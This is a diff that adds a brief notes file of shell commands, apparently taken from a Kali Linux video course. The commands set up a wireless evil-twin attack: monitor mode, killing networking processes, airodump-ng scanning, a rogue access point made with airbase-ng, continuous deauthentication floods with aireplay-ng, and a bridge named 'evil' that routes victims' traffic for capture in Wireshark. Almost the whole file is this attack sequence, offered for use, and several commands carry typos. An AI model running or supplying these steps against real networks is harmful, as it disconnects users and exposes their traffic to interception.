@@ -1,0 +1,29 @@
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor 
+airmon-ng check wlan0
+kill 4734
+kill 30664
+kill 11289
+
+Above codesd can check and kill networking using programs.
+
+airodump-ng wlan0
+airbase-ng -a mac_address -esssid "Something" -c 6 wlan0
+aireplay-ng -0 0 -a mac_address wlan0
+
+yum search bridge-utils
+yum install bridge-utils -y
+brctl addbr evil
+ifconfig
+brctl addif evil p8pl
+brctl addif evil et0
+ifconfig at0 0.0.0.0 up
+dhclient evil
+
+yum search wireshark
+#Watch 46 Video to How work with wireshark Software in Kali linux
+
+
+
+
+
